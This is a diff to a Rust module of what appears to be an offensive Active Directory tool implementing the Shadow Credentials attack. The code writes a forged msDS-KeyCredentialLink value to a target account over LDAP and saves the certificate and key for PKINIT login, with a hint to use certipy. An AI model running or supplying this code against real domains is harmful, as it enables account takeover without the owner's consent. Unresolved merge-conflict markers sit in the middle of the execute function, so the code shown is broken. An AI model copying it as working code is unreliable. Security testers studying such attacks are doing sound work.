@@ -215,11 +215,11 @@ pub fn generate_key_id() -> String {
 
 /// Build the LDAP modification for msDS-KeyCredentialLink
 pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
-    // The value format is:
-    // B:8:01000000<key_id_hex>:<key_credential_hex>
-
-    let key_id_bytes = parse_guid(&key_cred.key_id);
-    let key_id_hex: String = key_id_bytes.iter().map(|b| format!("{:02X}", b)).collect();
+    // DN-with-Binary format: B:<hex_char_count>:<hex_binary_data>:<distinguished_name>
+    // - hex_char_count = number of hex characters in the binary blob (raw_value.len() * 2)
+    // - hex_binary_data = hex-encoded key credential blob
+    // - distinguished_name = DN of the target object (key_cred.dn)
+    let hex_char_count = key_cred.raw_value.len() * 2;
 
     let cred_hex: String = key_cred
         .raw_value
@@ -227,7 +227,7 @@ pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
         .map(|b| format!("{:02X}", b))
         .collect();
 
-    format!("B:8:01000000{}:{}", key_id_hex, cred_hex)
+    format!("B:{}:{}:{}", hex_char_count, cred_hex, key_cred.dn)
 }
 
 /// Parse existing key credentials from LDAP
@@ -320,6 +320,7 @@ pub async fn execute(
         cred_blob.len()
     );
 
+<<<<<<< HEAD
     // Step 3: Resolve target DN via LDAP
     let target_filter = if config.target.contains(',') {
         // Already a DN
@@ -331,6 +332,38 @@ pub async fn execute(
         )
     } else {
         format!("(&(objectClass=user)(sAMAccountName={}))", config.target)
+=======
+    // Resolve the actual DN of the target via LDAP search so the DN-with-Binary
+    // value includes the correct distinguished name rather than an empty string.
+    let target_dn = {
+        let filter = format!(
+            "(&(|(objectClass=user)(objectClass=computer))(sAMAccountName={}))",
+            config.target
+        );
+        match ldap
+            .custom_search(&filter, &["distinguishedName"])
+            .await
+        {
+            Ok(entries) if !entries.is_empty() => entries[0]
+                .attrs
+                .get("distinguishedName")
+                .and_then(|v| v.first())
+                .cloned()
+                .unwrap_or_else(|| config.target.clone()),
+            _ => {
+                info!("ShadowCredentials: Could not resolve DN for '{}'; using sAMAccountName as fallback", config.target);
+                config.target.clone()
+            }
+        }
+    };
+
+    let key_cred = KeyCredential {
+        dn: target_dn,
+        key_id: key_pair.key_id.clone(),
+        raw_value: cred_data.clone(),
+        created: Utc::now(),
+        is_ours: true,
+>>>>>>> origin/main
     };
 
     let entries = ldap
@@ -364,7 +397,27 @@ pub async fn execute(
         target_dn
     );
 
+<<<<<<< HEAD
     // Step 5: Save key material to disk for PKINIT (e.g., via certipy or Rubeus)
+=======
+    // Attempt the LDAP write to apply the msDS-KeyCredentialLink modification.
+    // success is only set to true after the LDAP modify operation is confirmed.
+    let ldap_write_ok = match ldap
+        .modify_add(&config.target, "msDS-KeyCredentialLink", &[ldap_mod_value])
+        .await
+    {
+        Ok(()) => {
+            info!("ShadowCredentials: LDAP msDS-KeyCredentialLink write succeeded");
+            true
+        }
+        Err(e) => {
+            info!("ShadowCredentials: LDAP write failed: {e}. Key material saved for manual use.");
+            false
+        }
+    };
+
+    // Save key material to files for external PKINIT tools
+>>>>>>> origin/main
     let output_prefix = format!("shadow_creds_{}", &key_pair.key_id[..8]);
     let cert_path = format!("{output_prefix}.pem");
     let key_path = format!("{output_prefix}.key");
@@ -380,19 +433,27 @@ pub async fn execute(
         info!("ShadowCredentials: Private key written to {key_path}");
     }
 
+<<<<<<< HEAD
     info!(
         "ShadowCredentials: Attack complete. Use the certificate and key for PKINIT:\n  \
          certipy auth -pfx {}.pfx -dc-ip <DC>",
         output_prefix
     );
 
+=======
+    // success is set only after LDAP write verification
+>>>>>>> origin/main
     Ok(ShadowCredentialsResult {
         target: config.target.clone(),
-        success: true,
+        success: ldap_write_ok,
         key_id: key_pair.key_id,
         cleaned_up: false,
         tgt: None,
-        error: None,
+        error: if ldap_write_ok {
+            None
+        } else {
+            Some("LDAP write not confirmed — apply key material manually".to_string())
+        },
     })
 }
 
@@ -543,6 +604,9 @@ mod tests {
         };
 
         let mod_value = build_ldap_modification(&cred);
-        assert!(mod_value.starts_with("B:8:01000000"));
+        // Correct DN-with-Binary format: B:<hex_char_count>:<hex_data>:<DN>
+        // raw_value = [0x01, 0x00] → 2 bytes → 4 hex chars → "0100"
+        assert!(mod_value.starts_with("B:4:0100:"));
+        assert!(mod_value.ends_with("CN=Test,CN=Users,DC=domain,DC=local"));
     }
 }
